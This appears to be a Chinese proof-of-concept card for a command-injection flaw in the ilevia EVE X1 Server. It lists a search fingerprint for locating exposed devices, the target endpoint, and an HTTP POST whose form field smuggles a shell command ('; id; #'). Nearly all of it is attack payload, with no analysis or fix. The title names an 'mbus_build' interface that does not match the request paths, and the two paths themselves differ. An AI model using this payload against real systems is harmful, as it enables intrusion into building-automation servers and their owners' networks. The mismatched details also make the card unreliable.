# ileviaEVEX1Server接口mbus_build存在远程命令执行漏洞

- **系统**：ileviaEVEX1Server　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="ilevia-EVE-X1-Server"`
- **请求**：`POST /ajax/history/get_history_data_odic.php HTTP/1.1`
- **关键头**：`Content-Length: 18`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
e="; id; #
POST /history/get_history_data_odic.php HTTP/1.1
Host:
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
e="; id; #
```
- **预期**：200　|　—